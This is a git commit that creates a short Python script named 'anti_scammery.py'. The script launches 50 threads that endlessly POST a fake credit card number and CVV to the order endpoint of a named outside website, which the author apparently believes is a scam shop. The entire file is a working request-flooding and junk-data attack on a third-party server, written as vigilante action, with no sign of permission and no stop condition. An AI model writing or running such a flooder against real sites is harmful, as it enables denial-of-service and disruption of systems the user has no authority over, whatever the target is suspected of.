d0514b09f95901e11894684ef9c959097a8a04f7
Gerald Southwood <72921662+VertX-G@users.noreply.github.com>
2021-04-30 15:58:14 +0200

    Create anti_scammery.py

---
+++ anti_scammery.py
@@ -0,0 +1,31 @@
+import requests
+import threading
+
+url = 'http://luckypro12.com/PS5/includes/submit_order_limelight.php'
+
+data = {
+  'cc_number': '4007000000027',
+  'cc_expmonth': '08',
+  'cc_expyear': '21',
+  'cc_cvv': '234',
+}
+
+# Multithread this btch
+def do_request():
+  while True:
+    response = requests.post(url, data=data).text
+    print(response)
+
+threads = []
+
+for i in range(50):
+  t = threading.Thread(target=do_request)
+  t.daemon = True
+  threads.append(t)
+  
+for i in range(50):
+  threads[i].start()
+  
+for i in range(50):
+  threads[i].join()
+  
